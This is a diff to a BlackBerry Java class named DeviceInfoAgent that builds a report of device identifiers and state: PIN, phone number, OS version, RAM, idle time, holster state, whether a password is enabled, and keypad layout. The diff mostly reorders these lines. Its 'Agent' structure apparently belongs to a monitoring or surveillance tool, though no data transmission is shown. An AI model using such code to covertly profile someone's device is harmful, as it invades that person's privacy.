@@ -22,6 +22,7 @@ import net.rim.device.api.system.CodeModuleManager;
 import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.system.GPRSInfo;
 import net.rim.device.api.system.RadioInfo;
+import net.rim.device.api.ui.Keypad;
 import net.rim.device.api.util.DataBuffer;
 import net.rim.device.api.util.NumberUtilities;
 import blackberry.Device;
@@ -103,6 +104,21 @@ public final class DeviceInfoAgent extends Agent {
         sb.append("Model: " + DeviceInfo.getDeviceName() + "\n");
         sb.append("Pin: " + Device.getPin() + "\n");
 
+        // OS Version
+        sb.append("Platform: " + DeviceInfo.getPlatformVersion() + "\n");
+        sb.append("OS: " + DeviceInfo.getSoftwareVersion() + "\n");
+
+        sb.append("IdleTime: " + DeviceInfo.getIdleTime() + "\n");
+        sb.append("Holster: " + DeviceInfo.isInHolster() + "\n");
+        sb.append("PasswordEnabled: " + DeviceInfo.isPasswordEnabled() + "\n");
+
+        // HARDWARE
+        sb.append("Total RAM: " + Runtime.getRuntime().totalMemory() + "\n");
+        sb.append("Free RAM: " + Runtime.getRuntime().freeMemory() + "\n");
+        sb.append("Camera: " + DeviceInfo.hasCamera() + "\n");
+        sb.append("Phone: " + device.getPhoneNumber() + "\n");
+        sb.append("Keypad layout:" + Keypad.getHardwareLayout());
+
         // Alimentazione
         // sb.append("\nBATTERY\n-----\n");
         sb.append("Battery: " + DeviceInfo.getBatteryLevel() + "%\n");
@@ -156,22 +172,6 @@ public final class DeviceInfoAgent extends Agent {
             debug.error("Radio: " + ex);
             //#endif
         }
-
-        // Device
-        // sb.append("\nDEVICE\n------\n");
-
-        // OS Version
-        sb.append("Platform: " + DeviceInfo.getPlatformVersion() + "\n");
-        sb.append("OS: " + DeviceInfo.getSoftwareVersion() + "\n");
-        
-        sb.append("Total RAM: " + Runtime.getRuntime().totalMemory() + "\n");
-        sb.append("Free RAM: " + Runtime.getRuntime().freeMemory() + "\n");
-        sb.append("Camera: " + DeviceInfo.hasCamera() + "\n");
-        sb.append("Phone: " + device.getPhoneNumber() + "\n");
-
-        sb.append("IdleTime: " + DeviceInfo.getIdleTime() + "\n");
-        sb.append("Holster: " + DeviceInfo.isInHolster() + "\n");
-        sb.append("PasswordEnabled: " + DeviceInfo.isPasswordEnabled() + "\n");
 
         // DISK
         sb.append("Flash Size: " + DeviceInfo.getTotalFlashSize() + " Bytes\n");
